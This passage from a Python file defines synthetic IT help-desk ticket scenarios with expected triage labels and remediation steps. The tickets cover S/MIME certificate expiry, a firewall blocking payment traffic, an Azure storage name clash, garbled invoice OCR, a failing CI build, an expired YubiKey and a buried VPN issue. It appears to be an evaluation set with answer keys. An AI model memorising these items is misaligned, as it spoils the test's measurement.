                "right port works fine. I've tried resetting SMC and NVRAM already. "
                "This is my primary workstation and I need the second port for my "
                "trading floor monitor setup.\n\n"
                "Asset tag: CNTSO-MBP-40221\n"
                "Assigned: March 2025\n"
                "AppleCare expires: March 2028"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "The system profiler dump confirms the left USB-C port's host "
                "controller is present but not detecting any devices, while the right "
                "port works normally. After SMC/NVRAM resets failed, this is likely a "
                "hardware defect. Schedule an Apple depot repair under AppleCare."
            ),
            remediation_steps=[
                "Confirm the issue persists after booting into macOS Recovery and testing the port with a known-good"
                " device.",
                "Run Apple Diagnostics (hold D at startup) to check for hardware fault codes on the USB controller.",
                "If diagnostics report a fault, initiate an AppleCare depot repair (coverage confirmed through March"
                " 2028).",
                "Issue a loaner MacBook Pro from the IT equipment pool while the device is in repair.",
                "Update the asset management system (CNTSO-MBP-40221) with the repair ticket number.",
            ],
            reporter_name="Derek Olsen",
            reporter_email="derek.olsen@contoso.com",
            reporter_department="Equities Trading",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "system-profiler", "macos-dump"],
            difficulty="medium",
        ),
        # ── DC-145  Base64 encoded email with S/MIME signature ─────────
        ScenarioDefinition(
            scenario_id="DC-145",
            subject="Can't open encrypted emails — S/MIME certificate issue",
            description=(
                "Since Monday I can't open any of the encrypted emails from external "
                "counsel. Outlook shows 'Microsoft Outlook had problems decrypting this "
                "message'. I exported one of the message headers — here's what I see:\n\n"
                "MIME-Version: 1.0\n"
                "Content-Type: application/pkcs7-mime;\n"
                "    smime-type=enveloped-data;\n"
                "    name=smime.p7m\n"
                "Content-Transfer-Encoding: base64\n"
                "Content-Disposition: attachment;\n"
                "    filename=smime.p7m\n\n"
                "MIIRqQYJKoZIhvcNAQcDoIIRmjCCEZYCAQAxggJLMIICRwIBADB\n"
                "vMGkxCzAJBgNVBAYTAlVTMRMwEQYDVQQIEwpXYXNoaW5ndG9u\n"
                "MRAwDgYDVQQHEwdSZWRtb25kMR4wHAYDVQQKExVDb250b3NvIE\n"
                "ZpbmFuY2lhbDETMBEGA1UEAxMKQ29udG9zbyBDQQICAQ0wDQYJ\n"
                "KoZIhvcNAQEBBQAEggIAjKL8mT5eX3rA7t+8PqFV2XJ4B9m6QD\n"
                "k5L+N7v2H1dN8yM3R5cXpSfQ9d4T2wK6bP8oY1lZ3nF0hR9qJm\n"
                "...(truncated ~200 lines of base64)...\n"
                "wZ0FTrEAe9h3Q7t8s==\n\n"
                "I also see this in the Outlook certificate dialog:\n"
                "  Issuer: CN=Contoso Financial CA, O=Contoso Financial, L=Redmond, "
                "S=Washington, C=US\n"
                "  Serial Number: 00:0D\n"
                "  Valid From: 2024-06-15\n"
                "  Valid To: 2026-03-15  <-- THIS EXPIRED!\n"
                "  Subject: CN=jessica.lang@contoso.com\n"
                "  Key Usage: Key Encipherment, Digital Signature\n\n"
                "So my S/MIME certificate expired on March 15, 2026, and now I can't "
                "decrypt anything that was encrypted to my old public key. I also can't "
                "send signed emails. I work in Legal and we exchange encrypted emails "
                "with outside counsel daily. This is blocking active deal work.\n\n"
                "Please issue me a new certificate and help me recover access to "
                "the old encrypted messages."
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD, MissingInfo.PREVIOUS_TICKET_ID],
            next_best_action=(
                "The S/MIME certificate (CN=jessica.lang@contoso.com) expired on "
                "2026-03-15. The base64 PKCS#7 blob is noise — the real issue is "
                "certificate renewal. Issue a new S/MIME certificate and ensure the "
                "old private key is archived so historical encrypted emails remain "
                "accessible."
            ),
            remediation_steps=[
                "Issue a new S/MIME certificate for jessica.lang@contoso.com from the Contoso Financial CA.",
                "Publish the new certificate to the Global Address List so external correspondents can encrypt to the"
                " new key.",
                "Archive the expired private key in the user's certificate store to retain access to previously"
                " encrypted emails.",
                "Test decryption of an existing encrypted email and sending a new signed email to external counsel.",
                "Set up a calendar reminder 30 days before the new certificate's expiration to avoid recurrence.",
            ],
            reporter_name="Jessica Lang",
            reporter_email="jessica.lang@contoso.com",
            reporter_department="Legal",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "smime", "encrypted-email"],
            difficulty="medium",
        ),
        # ── DC-146  Syslog flood — firewall logs ──────────────────────
        ScenarioDefinition(
            scenario_id="DC-146",
            subject="URGENT: Firewall blocking legitimate traffic — syslog dump",
            description=(
                "The Palo Alto firewall is blocking traffic to our payment gateway "
                "and we're losing transactions. I pulled syslog entries — there are "
                "THOUSANDS but here's a sample:\n\n"
                "Mar 21 09:14:01 pa-fw-01 1,2026/03/21 09:14:01,001234567890,TRAFFIC,"
                "drop,2049,2026/03/21 09:14:01,10.10.50.12,203.0.113.45,0.0.0.0,0.0.0.0,"
                "Block-Outbound,contoso\\svc-payment,,ssl,vsys1,trust,untrust,ae1.100,,"
                "Deny-Log,2026/03/21 09:14:01,45892,1,51234,443,0,0,0x0,tcp,deny,"
                "0,0,0,1,2026/03/21 09:14:01,0,any,0,12345678,0x0,10.0.0.0-10.255.255.255,"
                "US,0,1,0,policy-deny,0,0,0,0,,pa-fw-01,from-policy,,,0,,0,,N/A,0,0,0,0\n"
                "Mar 21 09:14:01 pa-fw-01 1,2026/03/21 09:14:01,001234567890,TRAFFIC,"
                "drop,2049,2026/03/21 09:14:01,10.10.50.13,203.0.113.45,0.0.0.0,0.0.0.0,"
                "Block-Outbound,contoso\\svc-payment,,ssl,vsys1,trust,untrust,ae1.100,,"
                "Deny-Log,2026/03/21 09:14:01,45893,1,51235,443,0,0,0x0,tcp,deny,"
                "0,0,0,1,2026/03/21 09:14:01,0,any,0,12345679,0x0,10.0.0.0-10.255.255.255,"
                "US,0,1,0,policy-deny,0,0,0,0,,pa-fw-01,from-policy,,,0,,0,,N/A,0,0,0,0\n"
                "Mar 21 09:14:02 pa-fw-01 1,2026/03/21 09:14:02,001234567890,TRAFFIC,"
                "drop,2049,2026/03/21 09:14:02,10.10.50.14,203.0.113.45,0.0.0.0,0.0.0.0,"
                "Block-Outbound,contoso\\svc-payment,,ssl,vsys1,trust,untrust,ae1.100,,"
                "Deny-Log,2026/03/21 09:14:02,45894,1,51236,443,0,0,0x0,tcp,deny,"
                "0,0,0,1,2026/03/21 09:14:02,0,any,0,12345680,0x0,10.0.0.0-10.255.255.255,"
                "US,0,1,0,policy-deny,0,0,0,0,,pa-fw-01,from-policy,,,0,,0,,N/A,0,0,0,0\n"
                "Mar 21 09:14:02 pa-fw-01 1,2026/03/21 09:14:02,001234567890,TRAFFIC,"
                "drop,2049,2026/03/21 09:14:02,10.10.50.15,203.0.113.45,0.0.0.0,0.0.0.0,"
                "Block-Outbound,contoso\\svc-payment,,ssl,vsys1,trust,untrust,ae1.100,,"
                "Deny-Log,2026/03/21 09:14:02,45895,1,51237,443,0,0,0x0,tcp,deny,"
                "0,0,0,1,2026/03/21 09:14:02,0,any,0,12345681,0x0,10.0.0.0-10.255.255.255,"
                "US,0,1,0,policy-deny,0,0,0,0,,pa-fw-01,from-policy,,,0,,0,,N/A,0,0,0,0\n"
                "Mar 21 09:14:03 pa-fw-01 1,2026/03/21 09:14:03,001234567890,TRAFFIC,"
                "drop,2049,2026/03/21 09:14:03,10.10.50.12,203.0.113.46,0.0.0.0,0.0.0.0,"
                "Block-Outbound,contoso\\svc-payment,,ssl,vsys1,trust,untrust,ae1.100,,"
                "Deny-Log,2026/03/21 09:14:03,45896,1,51238,443,0,0,0x0,tcp,deny,"
                "0,0,0,1,2026/03/21 09:14:03,0,any,0,12345682,0x0,10.0.0.0-10.255.255.255,"
                "US,0,1,0,policy-deny,0,0,0,0,,pa-fw-01,from-policy,,,0,,0,,N/A,0,0,0,0\n\n"
                "(hundreds more lines like this — all DENY on port 443 to 203.0.113.0/24)\n\n"
                "All payment processing traffic from the svc-payment service accounts "
                "(10.10.50.12-15) to the payment gateway at 203.0.113.45 and .46 is being "
                "denied by the 'Block-Outbound' rule on pa-fw-01. This started after last "
                "night's change window. We are losing approximately $12,000 per minute in "
                "failed transactions. Payment Operations has confirmed the gateway IPs haven't "
                "changed. This needs IMMEDIATE resolution."
            ),
            category=Category.NETWORK,
            priority=Priority.P1,
            team=Team.NETWORK_OPS,
            needs_escalation=True,
            missing_info=[MissingInfo.PREVIOUS_TICKET_ID, MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "The syslog flood is noise but consistently shows the 'Block-Outbound' "
                "policy on pa-fw-01 denying all TCP/443 traffic from the payment service "
                "subnet (10.10.50.0/24) to the payment gateway (203.0.113.45-46). This "
                "started after last night's change window — review the firewall change log "
                "and restore the allow rule immediately."
            ),
            remediation_steps=[
                "Review the change management log for last night's window to identify what rule was modified on"
                " pa-fw-01.",
                "Add an emergency allow rule for 10.10.50.0/24 -> 203.0.113.45-46 on TCP/443 to restore payment traffic"
                " immediately.",
                "Verify payment transactions are flowing again by checking the payment gateway dashboard.",
                "Conduct a post-incident review of the change that introduced the blocking rule.",
                "Implement a pre-change validation check that tests connectivity to critical payment endpoints before"
                " committing firewall changes.",
            ],
            reporter_name="Carlos Mendez",
            reporter_email="carlos.mendez@contoso.com",
            reporter_department="Payment Operations",
            channel=Channel.PHONE,
            tags=["data-cleanup", "syslog-flood", "firewall-logs"],
            difficulty="hard",
        ),
        # ── DC-147  Azure Resource Manager (ARM) template dump ─────────
        ScenarioDefinition(
            scenario_id="DC-147",
            subject="Resource group deployment failing — ARM template attached",
            description=(
                "Our ARM template deployment for the new analytics resource group keeps "
                "failing. I'm attaching the full template so you can see what we're "
                "deploying:\n\n"
                "{\n"
                '  "$schema": "https://schema.management.azure.com/schemas/'
                '2019-04-01/deploymentTemplate.json#",\n'
                '  "contentVersion": "1.0.0.0",\n'
                '  "parameters": {\n'
                '    "storageAccountName": {\n'
                '      "type": "string",\n'
                '      "defaultValue": "stcontosoanalyticsprod"\n'
                "    },\n"
                '    "location": {\n'
                '      "type": "string",\n'
                '      "defaultValue": "[resourceGroup().location]"\n'
                "    },\n"
                '    "sqlServerName": {\n'
                '      "type": "string",\n'
                '      "defaultValue": "sql-contoso-analytics-prod"\n'
                "    },\n"
                '    "sqlAdminPassword": {\n'
                '      "type": "securestring"\n'
                "    }\n"
                "  },\n"
                '  "resources": [\n'
                "    {\n"
                '      "type": "Microsoft.Storage/storageAccounts",\n'
                '      "apiVersion": "2023-01-01",\n'
                '      "name": "[parameters(\'storageAccountName\')]",\n'
                '      "location": "[parameters(\'location\')]",\n'
                '      "sku": { "name": "Standard_LRS" },\n'
                '      "kind": "StorageV2"\n'
                "    },\n"
                "    {\n"
                '      "type": "Microsoft.Sql/servers",\n'
                '      "apiVersion": "2022-05-01-preview",\n'
                '      "name": "[parameters(\'sqlServerName\')]",\n'
                '      "location": "[parameters(\'location\')]",\n'
                '      "properties": {\n'
                '        "administratorLogin": "contosoadmin",\n'
                '        "administratorLoginPassword": "[parameters(\'sqlAdminPassword\')]",\n'
                '        "version": "12.0"\n'
                "      }\n"
                "    },\n"
                "    {\n"
                '      "type": "Microsoft.Sql/servers/databases",\n'
                '      "apiVersion": "2022-05-01-preview",\n'
                "      \"name\": \"[concat(parameters('sqlServerName'), '/analyticsdb')]\",\n"
                '      "location": "[parameters(\'location\')]",\n'
                '      "dependsOn": [\n'
                "        \"[resourceId('Microsoft.Sql/servers', "
                "parameters('sqlServerName'))]\"\n"
                "      ],\n"
                '      "sku": { "name": "P2", "tier": "Premium" },\n'
                '      "properties": { "collation": "SQL_Latin1_General_CP1_CI_AS" }\n'
                "    }\n"
                "  ]\n"
                "}\n\n"
                "The deployment error from the Azure portal is:\n"
                '"The storage account named stcontosoanalyticsprod is already taken. '
                '(Code: StorageAccountAlreadyTaken)"\n\n'
                "I'm deploying to the rg-contoso-analytics-prod resource group in East US 2. "
                "The storage account name needs to be globally unique but I thought we owned "
                "that name. This is blocking the data analytics platform migration scheduled "
                "for March 28, 2026. — Raj"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "The full ARM template is noise — the deployment error is clear: "
                "StorageAccountAlreadyTaken for 'stcontosoanalyticsprod'. Azure storage "
                "account names must be globally unique. Either the name is taken by another "
                "Azure tenant or it exists in a different subscription/resource group within "
                "Contoso."
            ),
            remediation_steps=[
                "Check if 'stcontosoanalyticsprod' exists in another Contoso subscription with `az storage account list"
                " --query \"[?name=='stcontosoanalyticsprod']\"` across all subscriptions.",
                "If the account exists elsewhere, coordinate with the owning team to either reuse or rename.",
                "If externally taken, choose a new globally unique name (e.g., 'stcntsoanalyticsprd01') and update the"
                " ARM template parameter.",
                "Re-run the deployment with `az deployment group create` using the corrected storage account name.",
                "Add a naming convention check to the CI/CD pipeline to validate resource name availability before"
                " deployment.",
            ],
            reporter_name="Raj Venkatesh",
            reporter_email="raj.venkatesh@contoso.com",
            reporter_department="Data Analytics Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "arm-template-dump", "azure-deployment"],
            difficulty="medium",
        ),
        # ── DC-148  Multi-page PDF OCR text (garbled) ──────────────────
        ScenarioDefinition(
            scenario_id="DC-148",
            subject="Invoice processing pipeline broken — OCR output garbled",
            description=(
                "The automated invoice processing system is producing garbage output. "
                "I pulled the OCR text from one of the failed invoices — you can see how "
                "garbled it is:\n\n"
                "C O N T O S O   F I N A N C I A L   S E R V I C E S\n"
                "I  N V O  |  C E\n"
                "──────────────────────────────────────────\n"
                "lnvo|ce Numb3r:    |NV-2026-03-00847\n"
                "Dat3:              March 22, 2O26\n"
                "Du3 Dat3:          Apri| 21, 2O26\n"
                "Vend0r:            Ac me  C|oud  Serv ices  LLC\n"
                "Vend0r lD:         VND - 00 4 4 2 1\n"
                "──────────────────────────────────────────\n"
                "  Qty     De scription              Un|t Pr|ce    T0tal\n"
                "──────────────────────────────────────────\n"
                "  1 2     Az ure Rese rved lnst.     $1,2 OO.OO   $14,4OO.OO\n"
                "   4      Prem ium  Su pp ort         $  5OO.OO    $2,OOO.OO\n"
                "   1      Data  Eg ress (1O TB)      $  87O.OO    $  87O.OO\n"
                "──────────────────────────────────────────\n"
                "                        Subt0ta|:              $17,27O.OO\n"
                "                        Tax (8.5%):             $1,467.95\n"
                "                        T0TAL DUE:            $18,737.95\n\n"
                "Pa yme nt Te rms: Net 3O\n"
                "Re mit to: ACH — Rout|ng O21OOOO89, Acc 4 4 7 8 XXXX XXXX\n\n"
                "[Page 2 of 4 — subsequent pages contain similar garbled line items and "
                "a signature block that OCR'd as wingdings]\n\n"
                "The OCR engine (ABBYY FineReader Server 16) started producing these "
                "garbled results after the March 20 update. About 340 invoices from the "
                "last two days are stuck in the queue with 'OCR_QUALITY_BELOW_THRESHOLD' "
                "errors. Accounts Payable can't process vendor payments until this is "
                "resolved. Total blocked invoice value is approximately $2.3M."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "The garbled OCR output is the noise — the real issue is that the ABBYY "
                "FineReader Server 16 update on March 20 broke OCR quality. 340 invoices "
                "($2.3M) are stuck. Roll back the update or reconfigure the OCR engine's "
                "recognition settings."
            ),
            remediation_steps=[
                "Roll back the March 20 ABBYY FineReader Server update to the previous version to restore OCR quality.",
                "Re-process a sample batch of stuck invoices to confirm OCR output quality is restored.",
                "If rollback isn't possible, contact ABBYY support with sample PDFs to get a hotfix for the recognition"
                " regression.",
                "Once OCR is working, requeue the 340 stuck invoices for reprocessing.",
                "Implement OCR quality validation on a test batch before applying future updates to the production"
                " pipeline.",
            ],
            reporter_name="Linda Fujimoto",
            reporter_email="linda.fujimoto@contoso.com",
            reporter_department="Accounts Payable",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "ocr-garbled", "pdf-ocr"],
            difficulty="hard",
        ),
        # ── DC-149  GitHub Actions workflow YAML + log ─────────────────
        ScenarioDefinition(
            scenario_id="DC-149",
            subject="Build pipeline failing on main — GitHub Actions log attached",
            description=(
                "The main branch build has been red since yesterday afternoon. I'm "
                "pasting our workflow config and the failure log:\n\n"
                "# .github/workflows/ci.yml\n"
                "name: Contoso Risk Engine CI\n"
                "on:\n"
                "  push:\n"
                "    branches: [main, develop]\n"
                "  pull_request:\n"
                "    branches: [main]\n\n"
                "jobs:\n"
                "  build-and-test:\n"
                "    runs-on: ubuntu-latest\n"
                "    strategy:\n"
                "      matrix:\n"
                "        python-version: ['3.11', '3.12']\n"
                "    services:\n"
                "      postgres:\n"
                "        image: postgres:15\n"
                "        env:\n"
                "          POSTGRES_PASSWORD: testpass\n"
                "          POSTGRES_DB: riskengine_test\n"
                "        ports:\n"
                "          - 5432:5432\n"
                "        options: >-\n"
                "          --health-cmd pg_isready\n"
                "          --health-interval 10s\n"
                "          --health-timeout 5s\n"
                "          --health-retries 5\n"
                "    steps:\n"
                "      - uses: actions/checkout@v4\n"
                "      - name: Set up Python ${{ matrix.python-version }}\n"
                "        uses: actions/setup-python@v5\n"
                "        with:\n"
                "          python-version: ${{ matrix.python-version }}\n"
                "      - name: Install dependencies\n"
                "        run: |\n"
                "          pip install -r requirements.txt\n"
                "          pip install -r requirements-dev.txt\n"
                "      - name: Run tests\n"
                "        run: pytest --cov=src --cov-report=xml -v\n"
                "        env:\n"
                "          DATABASE_URL: postgresql://postgres:testpass@localhost:5432/"
                "riskengine_test\n\n"
                "--- Run log (failed) ---\n"
                "Run pytest --cov=src --cov-report=xml -v\n"
                "============================= test session starts ==============================\n"
                "platform linux -- Python 3.12.2, pytest-8.0.2, pluggy-1.4.0\n"
                "collected 847 items\n\n"
                "src/tests/test_risk_models.py::test_var_calculation PASSED\n"
                "src/tests/test_risk_models.py::test_stress_scenario PASSED\n"
                "src/tests/test_risk_models.py::test_monte_carlo_sim PASSED\n"
                "...(742 passed tests omitted)...\n"
                "src/tests/test_market_data.py::test_feed_connection FAILED\n"
                "src/tests/test_market_data.py::test_feed_reconnect FAILED\n"
                "src/tests/test_market_data.py::test_feed_snapshot FAILED\n\n"
                "FAILED src/tests/test_market_data.py::test_feed_connection - "
                "ConnectionRefusedError: [Errno 111] Connection refused\n"
                "FAILED src/tests/test_market_data.py::test_feed_reconnect - "
                "ConnectionRefusedError: [Errno 111] Connection refused\n"
                "FAILED src/tests/test_market_data.py::test_feed_snapshot - "
                "TimeoutError: Market data feed did not respond within 30s\n\n"
                "========================= 3 failed, 844 passed =========================\n"
                "Error: Process completed with exit code 1.\n\n"
                "This is blocking all PRs from merging. The 3 failing tests are in "
                "test_market_data.py and seem to be trying to connect to an external "
                "market data feed that isn't available in CI. This was working before — "
                "someone may have removed the mock. Build started failing after commit "
                "abc123f merged on March 23, 2026 at 3:47 PM."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.STEPS_TO_REPRODUCE, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "The workflow YAML is noise — the test log shows 844/847 tests pass but "
                "3 tests in test_market_data.py fail with ConnectionRefusedError, meaning "
                "they depend on an external market data feed unavailable in CI. The regression "
                "was introduced by commit abc123f on March 23. Check that commit for removed "
                "or broken mock fixtures."
            ),
            remediation_steps=[
                "Review commit abc123f to identify changes to test_market_data.py or its mock fixtures.",
                "Restore or fix the market data feed mock so tests don't depend on an external service in CI.",
                "Run the test suite locally with the fix to confirm all 847 tests pass.",
                "Push the fix to main and verify the GitHub Actions build goes green.",
                "Add a CI environment check to test_market_data.py that skips or mocks external feeds when DATABASE_URL"
                " indicates a CI environment.",
            ],
            reporter_name="Nathan Borkowski",
            reporter_email="nathan.borkowski@contoso.com",
            reporter_department="Risk Engine Development",
            channel=Channel.CHAT,
            tags=["data-cleanup", "github-actions-dump", "ci-pipeline-log"],
            difficulty="medium",
        ),
        # ── DC-150  Interleaved chat transcript (multiple participants)
        ScenarioDefinition(
            scenario_id="DC-150",
            subject="VPN token expired — Teams chat transcript with IT",
            description=(
                "Submitting this on behalf of my colleague who couldn't get into the "
                "portal. Here's the Teams chat transcript of her troubleshooting session "
                "with the help desk:\n\n"
                "[2026-03-24 08:02:14] Samira Hussain joined the chat\n"
                "[2026-03-24 08:02:15] System: Chat started with IT Help Desk\n"
                "[2026-03-24 08:02:18] Samira Hussain: Hi, I can't connect to the VPN "
                "this morning\n"
                "[2026-03-24 08:02:45] IT Help Desk (Bot): Hello! I'm the Contoso IT "
                "virtual assistant. Let me connect you with an agent. Your queue "
                "position: 3. Estimated wait: 4 minutes.\n"
                "[2026-03-24 08:03:01] System: Samira Hussain reacted with \U0001f44d to "
                '"Hello! I\'m the Contoso IT virtual assistant..."\n'
                "[2026-03-24 08:06:33] System: Agent Kevin Park joined the chat\n"
                "[2026-03-24 08:06:35] Kevin Park: Hi Samira, I'm Kevin from IT. What "
                "VPN client are you using?\n"
                "[2026-03-24 08:06:52] Samira Hussain: GlobalProtect 6.2\n"
                "[2026-03-24 08:07:15] Kevin Park: OK. What error do you see when you "
                "try to connect?\n"
                '[2026-03-24 08:07:44] Samira Hussain: It says "Authentication failed: '
                "token expired. Please contact your administrator to renew your MFA "
                'token."\n'
                "[2026-03-24 08:08:01] Kevin Park: Got it. When did this start?\n"
                "[2026-03-24 08:08:22] Samira Hussain: This morning. It was working "
                "Friday. I haven't changed anything.\n"
                "[2026-03-24 08:08:45] System: Kevin Park is typing...\n"
                "[2026-03-24 08:09:10] Kevin Park: Let me check your MFA token status. "
                "One moment.\n"
                "[2026-03-24 08:09:12] System: Samira Hussain reacted with \u2764\ufe0f to "
                '"Let me check your MFA token status..."\n'
                "[2026-03-24 08:11:30] Kevin Park: I can see your TOTP hardware token "
                "(serial: YK-5C-00293847) expired on 2026-03-22. These tokens have a "
                "2-year lifecycle. You'll need a replacement.\n"
                "[2026-03-24 08:11:58] Samira Hussain: Oh no. I'm working from home "
                "today and I need VPN to access the trading systems. Can you do anything "
                "remotely?\n"
                "[2026-03-24 08:12:30] Kevin Park: I can issue a temporary software "
                "token valid for 72 hours while we ship you a new hardware key. Would "
                "that work?\n"
                "[2026-03-24 08:12:45] Samira Hussain: Yes please!\n"
                "[2026-03-24 08:12:47] System: Samira Hussain reacted with \U0001f389 to "
                '"I can issue a temporary software token..."\n'
                "[2026-03-24 08:15:02] Kevin Park: OK, I've provisioned a temporary "
                "TOTP token to your Contoso Authenticator app. Please check and try "
                "connecting.\n"
                "[2026-03-24 08:16:30] Samira Hussain: It worked! I'm connected now. "
                "Thank you Kevin!\n"
                "[2026-03-24 08:16:45] Kevin Park: Great. I'm creating a ticket to ship "
                "you a replacement YubiKey. You should receive it within 3-5 business "
                "days. The temp token expires March 27.\n"
                "[2026-03-24 08:17:00] Samira Hussain: Perfect. Thanks so much.\n"
                "[2026-03-24 08:17:02] System: Samira Hussain rated the chat: \u2b50\u2b50\u2b50\u2b50\u2b50\n"
                "[2026-03-24 08:17:05] System: Chat ended\n\n"
                "So the temporary token is working now, but Samira still needs the "
                "permanent hardware token replacement shipped to her home address. "
                "Her employee ID is EMP-10482 and home address is on file in Workday. "
                "Please make sure the new YubiKey gets sent before March 27 when the "
                "temp token expires."
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P3,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.CONTACT_INFO],
            next_best_action=(
                "The chat transcript noise (reactions, system messages, bot messages) "
                "obscures a simple request: Samira Hussain's YubiKey hardware token "
                "(YK-5C-00293847) expired on 2026-03-22. A temporary software TOTP "
                "token is active until March 27. Ship a replacement YubiKey to her "
                "home address (on file in Workday, EMP-10482) before that date."
            ),
            remediation_steps=[
                "Look up Samira Hussain's home shipping address in Workday using employee ID EMP-10482.",
                "Initiate a YubiKey 5C replacement shipment via the IT hardware provisioning portal with expedited"
                " shipping.",
                "Verify the temporary TOTP software token is registered correctly and set to expire on March 27, 2026.",
                "Follow up with Samira on March 26 to confirm the replacement YubiKey has arrived and assist with"
                " enrollment.",
                "Decommission the expired hardware token (serial: YK-5C-00293847) in the MFA management console.",
            ],
            reporter_name="Omar Farouk",
            reporter_email="omar.farouk@contoso.com",
            reporter_department="Fixed Income Trading",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "chat-transcript-noise", "teams-transcript"],
            difficulty="medium",
        ),
        # ── DC-151  Very long email with deeply buried VPN issue ──────────
        ScenarioDefinition(
            scenario_id="DC-151",
            subject="Re: Re: Re: FW: Re: FW: Re: FW: Re: VPN access — URGENT follow-up (was: network issues)",
            description=(
                "Hi Help Desk,\n\n"
                "Forwarding this thread AGAIN. My VPN still does not connect after I changed my password last Friday. "
                "I have spoken to three different agents and nobody has resolved this. I am copying my manager and the "
                "trading floor lead because this is severely impacting our ability to execute "
                "afternoon block trades.\n\n"
                "Thanks,\nDaniel Okafor\nDirector, Institutional Sales\nContoso Financial Services\n"
                "Phone: +1 (212) 555-0273 | Mobile: +1 (917) 555-0184\n"
                "200 Park Avenue, 31st Floor, New York, NY 10166\n"
                "Bloomberg: DOKAFOR@CONTOSO | Reuters: daniel.okafor.contoso\n\n"
                "CONFIDENTIALITY NOTICE: This e-mail and any files transmitted with it are confidential and "
                "intended solely for the use of the individual or entity to whom they are addressed. If you have "
                "received this e-mail in error please notify the system manager. This message contains confidential "
                "information and is intended only for the individual named. If you are not the named addressee you "
                "should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by "
                "e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you "
                "are not the intended recipient you are notified that disclosing, copying, distributing or taking "
                "any action in reliance on the contents of this information is strictly prohibited.\n\n"
                "--- Forwarded message ---\n"
                "From: Lisa Park <lisa.park@contoso.com>\n"
                "Date: Wed, 19 Mar 2026 14:22:00 -0400\n"
                "To: Daniel Okafor <daniel.okafor@contoso.com>\n"
                "Subject: Re: VPN access\n\n"
                "Daniel, I checked with Network Ops and they said everything looks fine on their end. "
                "Have you tried clearing your credential cache? Also make sure you're using the new "
                "gateway address vpn-east.contoso.com instead of the old one.\n\n"
                "Lisa Park\nIT Service Desk Lead\nContoso Financial Services\n\n"
                "--- Original Message ---\n"
                "From: Daniel Okafor <daniel.okafor@contoso.com>\n"
                "Date: Wed, 19 Mar 2026 10:05:00 -0400\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Subject: Re: Re: FW: VPN access\n\n"
                "Team — still broken today. I changed my domain password on Friday as required by the "
                "quarterly rotation policy. After the change, GlobalProtect shows 'Authentication Failed — "
                "Invalid credentials' every time I try to connect. I have verified my new password works "
                "for Outlook, SharePoint, and the trading portal, so it is definitely correct.\n\n"
                "I am on a Dell Latitude 7440, Windows 11, GlobalProtect 6.2.1, connecting from home over "
                "Verizon FiOS. My colleague Anika on the same ISP has no issues.\n\n"
                "--- Forwarded message ---\n"
                "From: Help Desk <helpdesk@contoso.com>\n"
                "Date: Mon, 17 Mar 2026 16:30:00 -0400\n"
                "To: Daniel Okafor <daniel.okafor@contoso.com>\n"
                "Subject: Re: FW: VPN access\n\n"
                "Hi Daniel, we see your ticket INC-4872. Can you try clearing your Windows Credential "
                "Manager entries for 'vpn.contoso.com' and reconnecting? Steps:\n"
                "1. Open Control Panel > Credential Manager\n"
                "2. Click 'Windows Credentials'\n"
                "3. Find and remove any entries for vpn.contoso.com or globalprotect\n"
                "4. Restart GlobalProtect and try again\n\n"
                "Regards,\nIT Service Desk\nContoso Financial Services\n\n"
                "--- Original Message ---\n"
                "From: Daniel Okafor <daniel.okafor@contoso.com>\n"
                "Date: Mon, 17 Mar 2026 09:12:00 -0400\n"
                "To: IT Support <itsupport@contoso.com>\n"
                "Subject: FW: VPN access\n\n"
                "Hello, my VPN stopped working after I changed my password Friday. Error says invalid "
                "credentials but my password is correct. Please help ASAP — I cannot access any internal "
                "systems from home.\n\n"
                "Daniel Okafor\nDirector, Institutional Sales\nContoso Financial Services\n"
                "Phone: +1 (212) 555-0273 | Mobile: +1 (917) 555-0184\n"
                "200 Park Avenue, 31st Floor, New York, NY 10166\n\n"
                "\u00a9 2026 Contoso Financial Services. All rights reserved. Contoso Financial Services "
                "is a registered broker-dealer and member of FINRA and SIPC. This communication is issued "
                "by Contoso Financial Services and/or its affiliates. Contoso Financial Services is "
                "authorized and regulated by the Financial Conduct Authority. Registered in England and "
                "Wales. Company number 12345678. Registered office: 200 Park Avenue, New York, NY 10166. "
                "VAT number: GB 123 4567 89. Contoso Financial Services plc is listed on the New York "
                "Stock Exchange (Symbol: CTSO). Past performance is not indicative of future results. "
                "The information in this email is confidential and may be legally privileged. It is "
                "intended solely for the addressee. Access to this email by anyone else is unauthorized. "
                "If you are not the intended recipient, any disclosure, copying, distribution or any "
                "action taken or omitted to be taken in reliance on it, is prohibited and may be unlawful. "
                "When addressed to our clients any opinions or advice contained in this email are subject "
                "to the terms and conditions expressed in the governing Contoso Financial Services client "
                "agreement.\n\n"
                "--- End of thread ---\n\n"
                "This message has been scanned by Contoso Antivirus Gateway v4.12.1.\n"
                "No threats detected. Scan ID: AV-20260319-142200-OKAFOR-7893\n"
                "X-Contoso-Spam-Score: 0.02\nX-Contoso-Auth: DKIM=pass SPF=pass DMARC=pass"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.APPLICATION_VERSION],
            next_best_action=(
